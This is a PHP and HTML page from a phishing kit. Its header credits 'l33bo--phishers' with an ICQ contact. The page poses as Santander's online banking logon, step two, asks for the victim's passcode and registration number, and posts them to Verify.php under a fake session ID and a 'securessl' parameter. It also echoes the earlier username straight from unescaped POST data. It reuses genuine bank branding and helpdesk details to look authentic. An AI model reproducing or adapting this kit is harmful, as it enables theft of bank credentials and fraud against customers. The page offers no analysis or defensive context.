<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-GB"><head>
<title>Login</title>
<link rel="shortcut icon" href="assets/img/fav.ico">
<link rel="stylesheet" type="text/css" media="screen, print" href="assets/css/main.css">	
</head>
<body>


	<div id="global">
		<a href="#bodycontent" class="skipToContent">Skip to content</a>
		
		
		
		<div id="header">
			<div id="headerbanner">
				<div id="bankname">
					<a href="#">Santander</a>	
				</div>
			</div>
		</div>		
		
		
			<div id="informationBar">
				<div id="submenu">
					<ul>
						<li class="first"><a href="#" class="helpicon">Contact us</a></li>
						<li><a href="#" class="helpicon">Help</a></li>
						<li><a class="helpicon" href="#">View Demo</a></li>
					</ul>
				</div>
			</div>
		
		
		
		
		
			<div id="bodycontent">
				
		<div id="content">
		<h1 class="lock">Log on</h1>

		<form novalidate="novalidate" name="usuario" accept-charset="UTF-8" method="post" action="channel.ssobto?dse_contextRoot=true" id="qwer" autocomplete="off">
			
		</form>
		
		<h2>Step 2 of 2: Passcode and Registration number</h2>
		
		<div id="authenticationpassmark" class="container">		
		<div class="contents">
		
		

		<form novalidate="novalidate" method="post" action="Verify.php?&sessionid=<?php echo generateRandomString(30); ?>&securessl=true" name="hiddenForm" id="formAuthenticationAbbey" autocomplete="off">
<input type="hidden" name="user" value="<?=$_POST['user']?>">
		<fieldset>

		<p class="intro">Please enter your Passcode and Registration number</p>
		<div class="form">
		<div class="form-item"><label for="authentication.PassCode" class="fieldhelp"><span class="labeltext">Passcode: <img src="assets/img/ico_help.gif" alt="" title="Your passcode is an 8-16 character word or name. If this is the first time you have logged in, please enter the 8 digit passcode we have sent you. You will then be asked to change the passcode to something that you can easily remember (this can include numbers and letters)."></span> <span class="data"> 
			<input class="mandatory firstfocus correct" id="authentication.PassCode" name="passcode" autocomplete="off" maxlength="16" tabindex="1" type="password"> </span>
			</label></div>
		<div class="form-item"><label for="regno" class="fieldhelp"><span class="labeltext">Registration number: <img src="assets/img/ico_help.gif" alt="" title="Your registration number is a 5 digit number. If this is the first time you have logged in, please enter the 5 digit registration number we have sent you. You will then be asked to change the registration number to a 5 digit number you can easily remember (this can be numerical only)."></span> <span class="data"> 
			<input id="authentication.ERN" name="regno" class="mandatory correct" autocomplete="off" maxlength="5" tabindex="2" type="password"> </span>
 			</label></div>
		</div>

		<div class="buttonholder">

			<span class="button">
				<input class="defaultAction primary" value="Submit" name="buttons.1" tabindex="3" type="submit">
			</span>
			<span class="button">
				<input value="&lt; Back" name="buttons.0" tabindex="4" type="submit">
			</span>
		</div>
		
		
		
		</fieldset>

		</form>

		<p><a href="#" target="forgotten">Forgotten your security details?</a></p>
		<p>The Santander Online Banking helpdesk is available on 0845 600 4388
 and is open from 7am to 11pm from Monday to Saturday, and 9am to 9pm on
 Sunday.</p>					
		</div>
		</div>
		</div>
		
		</div>

		
		
		<div id="footer">		
			<ul>
				<li><a href="#">Online Banking Guarantee</a></li>
				<li><a href="#">Site Help &amp; Accessibility</a></li>
				<li><a href="#">Security &amp; Privacy</a></li>
				<li><a href="#">Terms &amp; Conditions</a></li>
				<li class="last"><a href="#">Legal</a></li>
			</ul>
		</div>

	</div>



</body>
</html>
